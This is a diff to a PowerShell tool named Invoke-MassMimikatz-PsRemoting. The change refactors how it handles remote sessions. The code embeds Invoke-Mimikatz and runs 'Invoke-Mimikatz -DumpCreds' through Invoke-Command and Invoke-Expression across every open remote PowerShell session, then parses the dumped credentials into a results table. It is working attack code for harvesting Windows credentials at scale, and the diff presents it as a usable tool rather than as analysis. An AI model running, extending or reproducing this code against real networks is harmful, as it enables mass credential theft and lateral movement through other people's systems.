@@ -1209,8 +1209,7 @@ function Invoke-MassMimikatz-PsRemoting
             if($SessionCount -ge 1){
 
                 # run the mimikatz command
-                Write-verbose "Running reflected Mimikatz against $SessionCount open ps sessions..."
-                $x = Get-PSSession            
+                Write-verbose "Running Mimikatz against $SessionCount open ps sessions..."         
                 
                 # original invoke-mimikatz               
 $HostedScript = 
@@ -3944,7 +3943,7 @@ Main
 }
 Invoke-Mimikatz -DumpCreds
 '@
-                $MimikatzOutput = Invoke-Command -Session $x -ScriptBlock {Invoke-Expression -Command  "$args"} -ArgumentList $HostedScript                
+                $MimikatzOutput = Invoke-Command -Session (Get-PSSession) -ScriptBlock {Invoke-Expression -Command  "$args"} -ArgumentList $HostedScript                
                 $TblResults = Parse-Mimikatz -raw $MimikatzOutput
                 $TblResults | foreach {
             
@@ -3987,8 +3986,8 @@ Invoke-Mimikatz -DumpCreds
 
                 # remove sessions
                 Write-verbose "Removing ps sessions..."
-                Disconnect-PSSession -Session $x | Out-Null
-                Remove-PSSession -Session $x | Out-Null
+                Get-PSSession | Disconnect-PSSession | Out-Null
+                Get-PSSession | Remove-PSSession | Out-Null
 
             }else{
                 Write-verbose "No ps sessions could be created."
